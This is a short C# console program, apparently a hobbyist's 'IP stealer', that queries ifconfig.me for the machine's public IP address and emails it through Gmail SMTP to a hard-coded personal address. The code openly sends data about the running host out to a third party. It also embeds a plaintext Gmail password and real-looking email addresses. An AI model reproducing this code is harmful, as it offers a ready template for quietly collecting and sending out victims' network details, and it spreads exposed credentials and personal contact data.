using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Net;
using System.Net.Mail;
using System.IO;

namespace ConsoleApp19
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.WriteLine("Ip Being stolen..");

            var request = (HttpWebRequest)WebRequest.Create("http://ifconfig.me");

            request.UserAgent = "curl"; // this will tell the server to return the information as if the request was made by the linux "curl" command

            string publicIPAddress;

            request.Method = "GET";
            using (WebResponse response = request.GetResponse())
            {
                using (var reader = new StreamReader(response.GetResponseStream()))
                {
                    publicIPAddress = reader.ReadToEnd();
                }
            }

            Console.WriteLine(publicIPAddress.Replace("\n", ""));
            Console.WriteLine("Ip Being Emailed to jac");

            //Specify senders gmail address
            string SendersAddress = "ooktemp@gmail.com";
            //Specify The Address You want to sent Email To(can be any valid email address)
            string ReceiversAddress = "jacquesrockell@gmail.com";
            //Specify The password of gmial account u are using to sent mail(pw of sender@gmail.com)
            const string SendersPassword = "autism123321";
            //Write the subject of ur mail
            const string subject = "IP";
            //Write the contents of your mail
            string body = publicIPAddress.Replace("\n", "");

            try
            {
                //we will use Smtp client which allows us to send email using SMTP Protocol
                //i have specified the properties of SmtpClient smtp within{}
                //gmails smtp server name is smtp.gmail.com and port number is 587
                SmtpClient smtp = new SmtpClient
                {
                    Host = "smtp.gmail.com",
                    Port = 587,
                    EnableSsl = true,
                    DeliveryMethod = SmtpDeliveryMethod.Network,
                    Credentials = new NetworkCredential(SendersAddress, SendersPassword),
                    Timeout = 3000
                };

                //MailMessage represents a mail message
                //it is 4 parameters(From,TO,subject,body)

                MailMessage message = new MailMessage(SendersAddress, ReceiversAddress, subject, body);
                /*WE use smtp sever we specified above to send the message(MailMessage message)*/

                smtp.Send(message);
                Console.WriteLine("Message Sent Successfully");
                Console.ReadKey();
            }

            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.ReadKey();
            }          
        }
    }
}
